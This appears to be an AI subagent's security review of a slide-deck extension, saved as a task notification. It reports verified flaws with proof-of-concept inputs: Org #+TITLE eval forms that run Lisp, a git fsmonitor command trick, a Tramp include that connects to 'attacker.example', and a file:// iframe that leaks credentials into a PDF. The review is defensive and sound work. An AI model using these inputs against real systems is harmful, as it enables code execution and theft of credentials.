@@ -1,0 +1,174 @@
+<task-notification>
+<task-id>a7654d3088d091372</task-id>
+<tool-use-id>toolu_01UWL8XSyE4MnLZgFTD4L6xn</tool-use-id>
+<output-file>/tmp/claude-1000/-home-sme-src-webframp-swamp-extensions/8de22bf7-67cf-4c78-bfdd-4867e3cd1ef8/tasks/a7654d3088d091372.output</output-file>
+<status>completed</status>
+<summary>Agent "Round-2 adversarial review: extension" finished</summary>
+<note>A task-notification fires each time this agent stops with no live background children of its own. The user can send it another message and resume it, so the same task-id may notify more than once.</note>
+<result>## Verdict: FAIL
+
+I found one CRITICAL and four HIGH security defects, all confirmed against real Emacs 31.1, pandoc 3.7 and Chromium. A deck file on its own can still run Lisp, write files anywhere and make ssh connections, and `export_pdf` prints files from outside the deck's directory into the stored PDF. Two of the round-1 fixes are incomplete: the macro advice misses the built-in macros, and the pandoc outline still numbers rules wrongly in the most common deck shape.
+
+All four gates pass, and so does the integration run (`PRESENTATION_INTEGRATION=1`, 71 tests). `swamp extension quality` reports `passed`, 100%, with two `deno-command` warnings left open. I modified no repository files; scratch work is in `/tmp/claude-1000/review-ext2/`.
+
+### [CRITICAL] Org's built-in title/date/author/email macros still evaluate Lisp
+**File:** `presentation/extensions/models/presentation/_lib/engines.ts` **Line(s):** 80–88
+**Issue:** The advice skips the last four template entries on the assumption that they are Org's built-ins. In Org 9.8, those entries carry the raw text of `#+TITLE`, `#+DATE`, `#+AUTHOR` and `#+EMAIL`. Org compiles any template that starts with `(eval` and runs it when the macro is expanded. Defining a macro called `title` is refused, but setting `#+TITLE` to an eval form is not. `#+SETUPFILE` is not a route, because Org reads these four keywords from the buffer only; an `#+INCLUDE`d file is.
+**Breaking input (verified, the marker file was created):**
+```org
+#+TITLE: (eval (progn (with-temp-file "/tmp/PWNED" (insert "x")) "Owned"))
+* A
+{{{title}}}
+```
+The same works with `#+DATE:` and `{{{date}}}`, `#+AUTHOR:` and `{{{author}}}`, and `#+EMAIL:` and `{{{email}}}`.
+**Impact:** Any deck runs arbitrary Lisp, which means arbitrary code as the user.
+**Fix:** Check all four built-ins too. Allow the `date` entry only when it is Org's own generated `(eval (if (org-string-nw-p $1) (org-format-timestamp '...` form, which is what a real timestamp `#+DATE` produces; refuse it otherwise. A simpler alternative is to advise `org-macro--set-templates` and refuse any eval template whose source is not Org's timestamp form. Add tests for all four keywords.
+
+### [HIGH] TTS options let a deck create and delete files in any directory
+**File:** `engines.ts` BUILD_EL (no guard on writes); org-re-reveal 3.39.0 at lines 3575–3605 and 1830–1845
+**Issue:** `reveal_with_tts`, `#+REVEAL_TTS_DIR` and `#+REVEAL_TTS_NAME_PREFIX` come from the deck. The export then:
+- runs `make-directory` on the deck's directory;
+- deletes `&lt;dir&gt;&lt;prefix&gt;.tts` if it exists;
+- appends to that file;
+- writes each slide's speaker notes to `&lt;dir&gt;&lt;md5&gt;`.
+**Breaking input (verified, both files appeared outside the deck):**
+```org
+#+OPTIONS: reveal_with_tts:t
+#+REVEAL_TTS_DIR: /tmp/claude-1000/review-ext2/ttsout/
+#+REVEAL_TTS_NAME_PREFIX: evil
+* A
+#+BEGIN_NOTES
+echo PWNED-via-tts
+#+END_NOTES
+```
+This produced `ttsout/evil.tts` and `ttsout/6f028d…` containing `echo PWNED via tts`.
+**Impact:** The deck chooses the directory and much of the content of files written anywhere the user can write. Any `*.tts` file can be deleted. On systems where `~/.bashrc` sources every file in `~/.bashrc.d/`, this becomes code execution.
+**Fix:** Set `org-re-reveal-with-tts nil`, remove `org-re-reveal-prepare-tts` from `org-export-before-parsing-functions`, and refuse the option. Defence in depth: advise `write-region`, `append-to-file`, `make-directory` and `delete-file` to allow only the output path.
+
+### [HIGH] Building a deck inside a crafted git checkout runs shell commands
+**File:** `engines.ts` **Line(s):** 114 (`find-file-noselect`)
+**Issue:** `find-file-noselect` runs `vc-refresh-state`, which runs `git` in the deck's directory, and `{{{modification-time(%Y,t)}}}` runs `git log` as well. A `.git/config` in that directory, or in any parent, is honoured. The extension already treats `.git` as sensitive for reads but lets Emacs execute git against it.
+**Breaking input (verified):** a deck directory that is a git repo with `git config core.fsmonitor "touch $D/PWNED-fsmonitor; false"`, containing a plain `* A` deck. Building it created `PWNED-fsmonitor`.
+**Impact:** Arbitrary command execution when the deck's directory comes from an untrusted archive.
+**Fix:** In BUILD_EL, `(setq vc-handled-backends nil)` and clear `find-file-hook`, or load the source with `insert-file-contents` into a buffer in `org-mode` instead of `find-file-noselect`.
+
+### [HIGH] Remote paths make Emacs ssh to a host the deck names
+**File:** `engines.ts` **Line(s):** 103–113
+**Issue:** The read guard calls `file-truename`, and Org calls `file-readable-p`, before any refusal. On a `/ssh:host:` path, both open a Tramp connection.
+**Breaking input (verified with an ssh shim on PATH):** `#+INCLUDE: "/ssh:attacker.example:/etc/hostname" src text` ran `ssh -e none attacker.example`, then the build failed.
+**Impact:** Outbound SSH to an attacker's host using the user's `~/.ssh/config`, keys and agent. With `ForwardAgent` on, the attacker gets agent access. The README's claim of reading nothing outside the deck's directory does not hold.
+**Fix:** Set `tramp-mode nil` and remove the Tramp entries from `file-name-handler-alist` at the top of BUILD_EL. Refuse any path where `(file-remote-p f)` is true before calling `file-truename`.
+
+### [HIGH] `export_pdf` prints local files from outside the deck into the PDF
+**File:** `presentation/extensions/models/presentation/deck.ts` **Line(s):** 735–745; `_lib/pdf.ts` 58–59
+**Issue:** Chromium opens the deck as a `file://` page. Raw HTML in the deck (`&lt;iframe&gt;`, `&lt;img&gt;`, `&lt;object&gt;` pointing at local paths) loads and renders any file the user can read. The confined inliner only governs build-time inlining.
+**Breaking input (verified, the marker appears on page 2 of the stored PDF):**
+```markdown
+&lt;iframe src="file:///tmp/claude-1000/review-ext2/t8/secret.txt" width="800" height="200"&gt;&lt;/iframe&gt;
+```
+Swapping in `file:///home/&lt;user&gt;/.aws/credentials` would print that instead.
+**Impact:** Files such as credentials and keys get copied into a swamp data artifact that may be shared.
+**Fix:** Do not print from a `file:` origin. Either serve the HTML from a one-file local HTTP server, or use `Fetch.enable` and fail every request whose URL is not the deck itself or an `https:` URL. Add an integration test.
+
+### [MEDIUM] `external` and "self-contained" under-report what the deck loads
+**File:** `presentation/extensions/models/presentation/_lib/html.ts` **Line(s):** 50–57, 341, 501–543
+**Issue:**
+- The tag pattern `&lt;tag[^&gt;]*&gt;` stops at the first `&gt;`, even one inside a quoted attribute value.
+- `RESOURCE_ATTRS` omits `srcset`, `object data`, SVG `href`/`xlink:href`, the legacy `background` attribute, and `link rel=modulepreload/prefetch/manifest`.
+- An HTML comment containing `&lt;script&gt;` or `&lt;textarea&gt;` makes `segments()` treat the rest of the page as opaque.
+**Breaking input (verified, pandoc engine, `selfContained: true`):** `&lt;img alt="x&gt;y" src="https://t1.example/gt.png"&gt;`, `&lt;img srcset="https://t2…"&gt;`, `&lt;object data="https://t3…"&gt;`, `&lt;svg&gt;&lt;image href="https://t4…"/&gt;&lt;/svg&gt;`, `&lt;table background="https://t5…"&gt;`, `&lt;link rel="modulepreload" href="https://t6…"&gt;` and `&lt;img alt="q&gt;" src="a.png"&gt;`. Only `t7` (`&lt;input src&gt;`) was reported. `a.png` was neither inlined nor warned about.
+**Impact:** A deck that reports offline and self-contained still fetches remote resources (tracking pixels) and references local files.
+**Fix:** Use a quote-aware tag scanner, for example `&lt;tag(?:"[^"]*"|'[^']*'|[^'"&gt;])*&gt;`, shared by every function. Extend the attribute set. Skip comments in `segments`.
+
+### [MEDIUM] Src-block language names call a `&lt;lang&gt;-mode` function the deck chooses
+**File:** BUILD_EL (no restriction); ox-html `org-html-fontify-code` (`funcall lang-mode`)
+**Issue:** Without the highlight plugin, htmlize fontifies every src block by calling `&lt;lang&gt;-mode`.
+**Breaking input (verified, run with HOME set to a scratch directory):** a block opened with `#+BEGIN_SRC savehist` enabled `savehist-mode`, which wrote `$HOME/.emacs.d/history` on exit.
+**Impact:** The deck can call any `*-mode` command, contrary to "runs nothing it names", including ones that write files outside its directory.
+**Fix:** Advise `org-src-get-lang-mode` to return nil (or `fundamental-mode`) for anything outside a fixed allowlist, or set `org-re-reveal-no-htmlize-src t`.
+
+### [MEDIUM] Repointing a symlinked source breaks its own deck
+**File:** `deck.ts` **Line(s):** 360–363, 378–392
+**Issue:** The deck is named after the link but owned by the link's target. Repointing the link, which is the point of the README's `current.org → v3.org` example, makes every later build fail.
+**Breaking input (verified):** build `current.md → v3.md`, repoint it to `v4.md`, then build again. Result: `Deck name "current" already belongs to v3.md`.
+**Fix:** Record ownership by the path as given, made relative to the repository and not resolved through symlinks.
+
+### [MEDIUM] The pandoc outline numbers horizontal rules wrongly under a level-1 heading
+**File:** `presentation/extensions/models/presentation/_lib/source.ts` **Line(s):** 281–355
+**Issue:** pandoc puts a rule (or `***`, `___`, `- - -`) after a level-1 heading into that heading's vertical stack. The outline makes it a new top-level slide. It also has three smaller mismatches:
+- It drops the untitled slide pandoc creates for content before the first heading, including lists and blockquotes containing rules.
+- It keeps `{.unnumbered}` and `{#id}` in titles.
+- It splits `# A` followed by `---` into two slides.
+
+**Breaking input (verified against real pandoc):**
+
+| Source | Build | Outline |
+|---|---|---|
+| `# A\n\ntext\n\n---\n\nafter` | `1, 1.2` | `1, 2` |
+| `# A\n\n* * *\n\nx\n\n## B\n\n---\n\n## C` | `1, 1.2, 1.3, 1.4` | `1, 2, 2.2, 2.3, 2.4` |
+| `intro text\n\n# A` | 2 slides | 1 slide |
+
+The integration test only exercises a shape where the two happen to agree.
+**Impact:** `slidesWithoutNotes` and the outline's indexes point at the wrong slides.
+**Fix:** Give a rule the level `min(current.level, 2)` whenever a level-1 heading is open. Emit an untitled slide for content before the first heading. Strip trailing `{...}` attributes from titles.
+
+### [MEDIUM] Chromium that ignores SIGTERM keeps `export_pdf` running past its timeout
+**File:** `presentation/extensions/models/presentation/_lib/pdf.ts` **Line(s):** 228–237
+**Issue:** The `finally` block sends SIGTERM, then waits for the process without a limit.
+**Breaking input (verified):** a fake chromium (`trap '' TERM; sleep 40`) with a 5 s timeout returned after 40 s.
+**Fix:** After a grace period, send SIGKILL, and bound the wait for exit.
+
+### [MEDIUM] A stored HTML that has gone missing can never be rebuilt
+**File:** `deck.ts` **Line(s):** 571–585, 715–718
+**Issue:** `unchanged` compares only the hash in the record and never checks that the HTML version still exists. Once that file is lost (datastore loss or partial sync), `export_pdf` says "Run build again", and the rebuild reports `unchanged` and writes nothing, indefinitely. The PDF branch has the same problem.
+**Fix:** Before keeping a prior version, confirm it exists with `getContent`, or add a `force` argument.
+
+### [LOW] Smaller defects
+- **Absolute paths in shared records.** Inliner warnings embed the deck directory (verified: `…: outside /tmp/claude-1000/review-ext2/t11, or inside .git…`), and `source.path` is absolute for sources outside the repository. Both end up in `deck-*` records. Make paths relative to the repository or the deck.
+- **Outline existence check is unconfined.** `missingImages` (deck.ts 626–643) checks absolute and `../` paths anywhere on the filesystem, so `outline-*` records whether a file exists. It also misses reference definitions, `data-background` and `url()` refs that the build does inline.
+- **Out-of-date claims.** The manifest says "Local images are always inlined, so a stored deck never depends on files beside its source", and the deck.ts module doc says the same. The README says a build "reads nothing outside its own directory". Since `../assets` is now refused, and given the PDF, Tramp and git findings, none of these hold.
+- **Untested Emacs/Org range.** README and manifest claim Emacs 27.2 and Org 9.4+, but the safety advice depends on the internals of `org-macro--collect-macros`. Only Emacs 31 / Org 9.8 was tested.
+- **Unbounded stderr.** Emacs and pandoc stderr has no size limit, and each warning line goes into `warnings` (for example the TTS warnings). The new output-size cap does not cover it.
+- **Case-variant `.git` on macOS.** `.GIT/config` passes the `.git` check on a case-insensitive filesystem (Emacs `file-truename` keeps the given case), and darwin platforms are declared.
+- **DevTools reachable by local processes.** `--remote-debugging-port=0` exposes full browser control to any process on the host while a print runs. `--remote-debugging-pipe` avoids that.
+- **Org outline gaps.** It ignores `#+EXCLUDE_TAGS`, and build titles for tagged headlines carry `&amp;nbsp` debris (`"2. D &amp;nbspskip"`).
+- **reveal-markdown rewrites code examples.** It inlines images inside fenced code too, so a slide showing `&lt;img src="logo.png"&gt;` gets a base64 blob.
+
+### Round-1 items that do hold
+I verified these with real inputs:
+- Deck-defined `(eval)` macros are refused, in the deck and through `#+SETUPFILE`.
+- Preamble functions are refused; `#+BIND`, `eval:` local variables and Babel (`:exports results`, `src_elisp{}`, `#+CALL`) all stay inert.
+- `#+LINK` `%(fn)` aborts.
+- Remote `#+SETUPFILE` aborts in batch.
+- `/proc/self/environ`, `../` and `.git` reads are refused.
+- Includes and SETUPFILEs in subdirectories, local `REVEAL_EXTRA_CSS`, Org's own macros and timestamp `{{{date(%Y)}}}` all still work.
+- Builds are byte-identical across separate Emacs runs, content mode included.
+- A page that spins its main thread hits the deadline after 10.05 s, and Chromium is killed.
+- Data-name prefixes cannot collide.
+- The workflow guard is correct.
+- Manifest and model versions match.
+- Refusing `../assets` and an outside `#+SETUPFILE` is documented in the README.
+
+## Swamp review dimensions
+
+| Dimension | Result | Note |
+|---|---|---|
+| credentials-secrets | issue | The PDF file:// leak, Tramp ssh using the user's agent and keys, and the git fsmonitor execution |
+| logging-quality | issue | Warnings embed absolute local paths; stderr warnings are unbounded |
+| error-handling | issue | "Run build again" advice never recovers; no SIGKILL fallback |
+| testing-completeness | issue | No tests for TITLE/DATE eval, TTS, vc/git, Tramp, src-lang modes, PDF file://, or attribute `&gt;` |
+| idempotency-resilience | issue | `unchanged` trusts the hash without checking the stored file exists |
+| api-contracts | issue | `external` and self-contained are dishonest for many resource types; the symlink naming contract breaks |
+| resource-management | issue | Unbounded wait for Chromium exit; unbounded stderr buffering |
+| published-surface-hygiene | issue | Manifest, README and module doc overclaim the security properties |
+| schema-strictness | pass | Zod schemas match what is written; argument refinements are correct |
+| lifetime-gc | pass | infinite lifetime, GC 20 for records and 10 for files; only the latest versions are referenced |
+| crud-completeness | pass | build, outline and export_pdf cover the model's purpose |
+| preflight-checks | pass | Engine/format validation and "not installed" errors come before work |
+| instance-names | pass | Prefixed and collision-free; derived from names, not timestamps |
+| data-access | issue | Confinement is incomplete: PDF origin, Tramp, outline stat outside the directory |
+| version-upgrades | pass | First release; manifest and model are both `2026.10.21.1`; RELEASE_NOTES present |
+
+## VERDICT: FAIL</result>
+<usage><subagent_tokens>194320</subagent_tokens><tool_uses>51</tool_uses><duration_ms>704257</duration_ms></usage>
+</task-notification>
